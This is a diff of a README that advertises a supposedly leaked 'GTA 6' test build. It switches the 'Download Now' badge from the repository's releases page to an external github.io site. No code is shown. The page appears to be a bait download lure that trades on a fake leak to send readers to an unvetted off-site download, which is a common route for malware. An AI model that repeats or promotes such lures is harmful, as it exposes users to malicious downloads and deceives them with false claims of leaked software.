@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Test-Build-Leaked-Source-Code - Play the Leaked GTA 6 Build Today
 
-[![Download Now](https://img.shields.io/badge/Download-GTA_6_Leaked_Build-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/Hayder336550/GTA-6-Test-Build-Leaked-Source-Code/releases)
+[![Download Now](https://img.shields.io/badge/Download-GTA_6_Leaked_Build-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://hayder336550.github.io)
 
 ---
 
